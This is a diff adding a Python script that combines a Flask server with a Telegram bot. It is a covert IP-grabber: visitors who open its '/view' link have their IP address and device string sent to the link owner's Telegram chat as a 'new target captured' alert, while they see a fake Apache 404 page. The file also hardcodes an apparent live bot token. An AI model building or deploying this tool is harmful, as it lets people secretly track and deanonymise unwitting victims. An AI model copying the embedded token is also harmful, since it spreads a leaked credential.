@@ -1,0 +1,48 @@
+import telebot
+from flask import Flask, request
+import threading
+import requests
+import os
+
+# --- الإعدادات ---
+TOKEN = '8605823267:AAHFc9AjSXieqfCIY2JcJUZvsw9LgnrLeng'
+bot = telebot.TeleBot(TOKEN)
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return "System Online", 200
+
+@app.route('/view')
+def capture():
+    owner_id = request.args.get('id')
+    ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
+    u_agent = request.headers.get('User-Agent')
+    
+    report = (
+        "🔥 **NEW TARGET CAPTURED** 🔥\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        f"🌐 IP: `{ip_addr}`\n"
+        f"📱 Device: `{u_agent[:100]}`\n"
+        "━━━━━━━━━━━━━━━━━━━━"
+    )
+    
+    if owner_id:
+        try:
+            bot.send_message(owner_id, report, parse_mode='Markdown')
+        except: pass
+            
+    return """<html><head><title>404 Not Found</title></head>
+    <body style="text-align: center; padding-top: 100px; font-family: Arial;">
+    <h1>404 Not Found</h1><p>The requested URL was not found on this server.</p>
+    <hr style="width: 50%;"><address>Apache/2.4.41 (Ubuntu) Server at port 80</address>
+    </body></html>""", 404
+
+def run_bot():
+    bot.polling(none_stop=True)
+
+if __name__ == '__main__':
+    threading.Thread(target=run_bot).start()
+    port = int(os.environ.get('PORT', 8080))
+    app.run(host='0.0.0.0', port=port)
+    
